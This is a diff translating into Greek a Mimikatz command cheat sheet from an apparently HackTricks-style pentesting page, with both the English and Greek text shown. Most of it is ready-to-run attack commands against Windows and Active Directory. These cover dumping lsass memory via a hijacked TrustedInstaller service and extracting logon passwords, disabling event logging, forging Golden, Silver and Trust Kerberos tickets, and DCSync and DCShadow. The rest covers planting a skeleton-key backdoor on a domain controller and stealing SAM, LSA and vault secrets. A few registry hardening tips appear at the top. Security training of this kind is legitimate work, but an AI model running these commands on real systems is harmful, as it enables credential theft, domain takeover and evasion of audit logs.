@@ -4,220 +4,209 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Εμβαθύνετε την εμπειρία σας στην **Ασφάλεια Κινητών** με την 8kSec Academy. Εξασκηθείτε στην ασφάλεια iOS και Android μέσω των αυτορυθμιζόμενων μαθημάτων μας και αποκτήστε πιστοποίηση:
 
 {% embed url="https://academy.8ksec.io/" %}
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
+**Αυτή η σελίδα βασίζεται σε μία από το [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Ελέγξτε την πρωτότυπη για περισσότερες πληροφορίες!
 
-## LM and Clear-Text in memory
+## LM και Clear-Text στη μνήμη
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Από τα Windows 8.1 και Windows Server 2012 R2 και μετά, έχουν εφαρμοστεί σημαντικά μέτρα για την προστασία από την κλοπή διαπιστευτηρίων:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LM hashes και plain-text passwords** δεν αποθηκεύονται πλέον στη μνήμη για την ενίσχυση της ασφάλειας. Μια συγκεκριμένη ρύθμιση μητρώου, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ πρέπει να ρυθμιστεί με μια τιμή DWORD `0` για να απενεργοποιηθεί η Αυθεντικοποίηση Digest, διασφαλίζοντας ότι οι "clear-text" κωδικοί πρόσβασης δεν αποθηκεύονται στην LSASS.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA Protection** εισάγεται για να προστατεύσει τη διαδικασία της Τοπικής Αρχής Ασφαλείας (LSA) από μη εξουσιοδοτημένη ανάγνωση μνήμης και έγχυση κώδικα. Αυτό επιτυγχάνεται με την επισήμανση της LSASS ως προστατευμένη διαδικασία. Η ενεργοποίηση της LSA Protection περιλαμβάνει:
+1. Τροποποίηση του μητρώου στο _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ ρυθμίζοντας το `RunAsPPL` σε `dword:00000001`.
+2. Υλοποίηση ενός Αντικειμένου Πολιτικής Ομάδας (GPO) που επιβάλλει αυτή την αλλαγή μητρώου σε διαχειριζόμενες συσκευές.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Παρά αυτές τις προστασίες, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν την LSA Protection χρησιμοποιώντας συγκεκριμένους οδηγούς, αν και τέτοιες ενέργειες είναι πιθανό να καταγραφούν στα αρχεία καταγραφής γεγονότων.
 
-### Counteracting SeDebugPrivilege Removal
+### Αντεπίθεση Αφαίρεσης SeDebugPrivilege
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Οι διαχειριστές συνήθως έχουν SeDebugPrivilege, επιτρέποντάς τους να αποσφαλματώνουν προγράμματα. Αυτό το προνόμιο μπορεί να περιοριστεί για να αποτραπούν μη εξουσιοδοτημένες εκφορτώσεις μνήμης, μια κοινή τεχνική που χρησιμοποιούν οι επιτιθέμενοι για να εξάγουν διαπιστευτήρια από τη μνήμη. Ωστόσο, ακόμη και με αυτό το προνόμιο αφαιρεμένο, ο λογαριασμός TrustedInstaller μπορεί να εκτελεί εκφορτώσεις μνήμης χρησιμοποιώντας μια προσαρμοσμένη ρύθμιση υπηρεσίας:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Αυτό επιτρέπει την εξαγωγή της μνήμης του `lsass.exe` σε ένα αρχείο, το οποίο μπορεί στη συνέχεια να αναλυθεί σε άλλο σύστημα για την εξαγωγή διαπιστευτηρίων:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-
 ## Mimikatz Options
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+Η παραχάραξη των καταγραφών συμβάντων στο Mimikatz περιλαμβάνει δύο κύριες ενέργειες: την εκκαθάριση των καταγραφών συμβάντων και την επιδιόρθωση της υπηρεσίας Event για να αποτραπεί η καταγραφή νέων συμβάντων. Παρακάτω παρατίθενται οι εντολές για την εκτέλεση αυτών των ενεργειών:
 
 #### Clearing Event Logs
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+- **Command**: Αυτή η ενέργεια στοχεύει στη διαγραφή των καταγραφών συμβάντων, καθιστώντας πιο δύσκολη την παρακολούθηση κακόβουλων δραστηριοτήτων.
+- Το Mimikatz δεν παρέχει άμεση εντολή στην τυπική του τεκμηρίωση για την εκκαθάριση των καταγραφών συμβάντων απευθείας μέσω της γραμμής εντολών του. Ωστόσο, η παραχάραξη των καταγραφών συμβάντων περιλαμβάνει συνήθως τη χρήση εργαλείων συστήματος ή σεναρίων εκτός του Mimikatz για την εκκαθάριση συγκεκριμένων καταγραφών (π.χ. χρησιμοποιώντας PowerShell ή Windows Event Viewer).
 
 #### Experimental Feature: Patching the Event Service
 
 - **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- Αυτή η πειραματική εντολή έχει σχεδιαστεί για να τροποποιεί τη συμπεριφορά της Υπηρεσίας Καταγραφής Συμβάντων, αποτρέποντας αποτελεσματικά την καταγραφή νέων συμβάντων.
+- Παράδειγμα: `mimikatz "privilege::debug" "event::drop" exit`
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+- Η εντολή `privilege::debug` διασφαλίζει ότι το Mimikatz λειτουργεί με τα απαραίτητα δικαιώματα για να τροποποιήσει τις υπηρεσίες του συστήματος.
+- Η εντολή `event::drop` στη συνέχεια επιδιορθώνει την υπηρεσία Καταγραφής Συμβάντων.
 
 ### Kerberos Ticket Attacks
 
 ### Golden Ticket Creation
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+Ένα Golden Ticket επιτρέπει την impersonation σε επίπεδο τομέα. Κύρια εντολή και παράμετροι:
 
 - Command: `kerberos::golden`
 - Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
+- `/domain`: Το όνομα τομέα.
+- `/sid`: Ο Αναγνωριστικός Αριθμός Ασφαλείας (SID) του τομέα.
+- `/user`: Το όνομα χρήστη που θα impersonate.
+- `/krbtgt`: Το NTLM hash του λογαριασμού υπηρεσίας KDC του τομέα.
+- `/ptt`: Εισάγει απευθείας το εισιτήριο στη μνήμη.
+- `/ticket`: Αποθηκεύει το εισιτήριο για μελλοντική χρήση.
 
-Example:
-
+Παράδειγμα:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Δημιουργία Silver Ticket
 
-### Silver Ticket Creation
+Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες υπηρεσίες. Κύριες εντολές και παράμετροι:
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Εντολή: Παρόμοια με το Golden Ticket αλλά στοχεύει συγκεκριμένες υπηρεσίες.
+- Παράμετροι:
+- `/service`: Η υπηρεσία που στοχεύει (π.χ., cifs, http).
+- Άλλες παράμετροι παρόμοιες με το Golden Ticket.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Παράδειγμα:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Δημιουργία Εισιτηρίου Εμπιστοσύνης
 
-### Trust Ticket Creation
+Τα Εισιτήρια Εμπιστοσύνης χρησιμοποιούνται για την πρόσβαση σε πόρους σε διάφορους τομείς εκμεταλλευόμενα τις σχέσεις εμπιστοσύνης. Κύρια εντολή και παράμετροι:
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Εντολή: Παρόμοια με το Golden Ticket αλλά για σχέσεις εμπιστοσύνης.
+- Παράμετροι:
+- `/target`: Το FQDN του στόχου τομέα.
+- `/rc4`: Το NTLM hash για τον λογαριασμό εμπιστοσύνης.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Παράδειγμα:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### Επιπλέον Εντολές Kerberos
 
-### Additional Kerberos Commands
+- **Καταγραφή Εισιτηρίων**:
 
-- **Listing Tickets**:
+- Εντολή: `kerberos::list`
+- Καταγράφει όλα τα εισιτήρια Kerberos για την τρέχουσα συνεδρία χρήστη.
 
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **Περάστε την Κρυφή Μνήμη**:
 
-- **Pass the Cache**:
+- Εντολή: `kerberos::ptc`
+- Ενσωματώνει εισιτήρια Kerberos από αρχεία κρυφής μνήμης.
+- Παράδειγμα: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Περάστε το Εισιτήριο**:
 
-- **Pass the Ticket**:
+- Εντολή: `kerberos::ptt`
+- Επιτρέπει τη χρήση ενός εισιτηρίου Kerberos σε άλλη συνεδρία.
+- Παράδειγμα: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **Καθαρισμός Εισιτηρίων**:
+- Εντολή: `kerberos::purge`
+- Καθαρίζει όλα τα εισιτήρια Kerberos από τη συνεδρία.
+- Χρήσιμο πριν τη χρήση εντολών χειρισμού εισιτηρίων για αποφυγή συγκρούσεων.
 
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+### Παρέμβαση Active Directory
 
-### Active Directory Tampering
+- **DCShadow**: Προσωρινά να κάνει μια μηχανή να λειτουργεί ως DC για χειρισμό αντικειμένων AD.
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCSync**: Μιμείται ένα DC για να ζητήσει δεδομένα κωδικών πρόσβασης.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+### Πρόσβαση Διαπιστευτηρίων
 
-### Credential Access
+- **LSADUMP::LSA**: Εξάγει διαπιστευτήρια από LSA.
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::NetSync**: Υποδύεται ένα DC χρησιμοποιώντας δεδομένα κωδικών πρόσβασης υπολογιστή.
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- _Δεν παρέχεται συγκεκριμένη εντολή για NetSync στο αρχικό κείμενο._
 
-  - _No specific command provided for NetSync in original context._
+- **LSADUMP::SAM**: Πρόσβαση στη τοπική βάση δεδομένων SAM.
 
-- **LSADUMP::SAM**: Access local SAM database.
+- `mimikatz "lsadump::sam" exit`
 
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::Secrets**: Αποκρυπτογραφεί μυστικά που είναι αποθηκευμένα στο μητρώο.
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- `mimikatz "lsadump::secrets" exit`
 
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::SetNTLM**: Ορίζει ένα νέο NTLM hash για έναν χρήστη.
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::Trust**: Ανακτά πληροφορίες πιστοποίησης εμπιστοσύνης.
+- `mimikatz "lsadump::trust" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+### Διάφορα
 
-### Miscellaneous
+- **MISC::Skeleton**: Ενσωματώνει ένα backdoor στο LSASS σε ένα DC.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+### Κλιμάκωση Δικαιωμάτων
 
-### Privilege Escalation
+- **PRIVILEGE::Backup**: Αποκτά δικαιώματα αντιγράφου ασφαλείας.
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- `mimikatz "privilege::backup" exit`
 
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Debug**: Αποκτά δικαιώματα αποσφαλμάτωσης.
+- `mimikatz "privilege::debug" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+### Εξαγωγή Διαπιστευτηρίων
 
-### Credential Dumping
+- **SEKURLSA::LogonPasswords**: Εμφανίζει διαπιστευτήρια για συνδεδεμένους χρήστες.
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::Tickets**: Εξάγει εισιτήρια Kerberos από τη μνήμη.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+### Χειρισμός SID και Token
 
-### Sid and Token Manipulation
+- **SID::add/modify**: Αλλάζει SID και SIDHistory.
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- Προσθήκη: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Τροποποίηση: _Δεν παρέχεται συγκεκριμένη εντολή για τροποποίηση στο αρχικό κείμενο._
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+- **TOKEN::Elevate**: Υποδύεται tokens.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+### Υπηρεσίες Τερματικού
 
-### Terminal Services
+- **TS::MultiRDP**: Επιτρέπει πολλαπλές συνεδρίες RDP.
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- `mimikatz "ts::multirdp" exit`
 
-  - `mimikatz "ts::multirdp" exit`
-
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+- **TS::Sessions**: Καταγράφει τις συνεδρίες TS/RDP.
+- _Δεν παρέχεται συγκεκριμένη εντολή για TS::Sessions στο αρχικό κείμενο._
 
 ### Vault
 
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Εξάγει κωδικούς πρόσβασης από το Windows Vault.
+- `mimikatz "vault::cred /patch" exit`
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Εμβαθύνετε την εμπειρία σας στην **Ασφάλεια Κινητών** με την 8kSec Academy. Κατακτήστε την ασφάλεια iOS και Android μέσω των αυτορυθμιζόμενων μαθημάτων μας και αποκτήστε πιστοποίηση:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
